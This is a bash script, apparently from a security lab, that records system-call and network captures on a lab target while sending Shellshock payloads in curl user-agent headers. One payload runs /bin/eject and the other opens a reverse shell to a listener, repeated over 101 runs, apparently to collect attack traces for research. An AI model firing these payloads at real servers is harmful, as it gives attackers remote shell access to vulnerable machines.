#!/bin/bash

for i in {100..200}
do
ssh -i ./server.pem softseclab@10.176.147.83  sudo sysdig_cap -w stream-$i.scap -z -s 4096 container.name=target and proc.name!=criu &

ssh -i ./server.pem softseclab@10.176.147.83 sudo nohup tcpdump_cap -i eth0 -s0 -w stream-$i.cap port not 22 and port not 3490 and port not 3492 and port not 3790 and port not 80 >pdump.out &

sleep 3
curl -k -A "() { :;}; /bin/eject" https://10.176.147.83/guestbook.html
sleep 1
ssh -i ./server.pem softseclab@10.176.147.83 nc -l -p 8000 &
sleep 2 
curl -k -A "() { :; }; /bin/bash -i >& /dev/tcp/10.0.3.1/8000 0>&1" https://10.176.147.83/cgi-bin/ss

sleep 4


ssh -i ./server.pem softseclab@10.176.147.83 sudo killall -s SIGINT sysdig_cap 
ssh -i ./server.pem softseclab@10.176.147.83 sudo killall -s SIGINT tcpdump_cap
ssh -i ./server.pem softseclab@10.176.147.83 sudo killall -s SIGINT nc




sleep 4
done


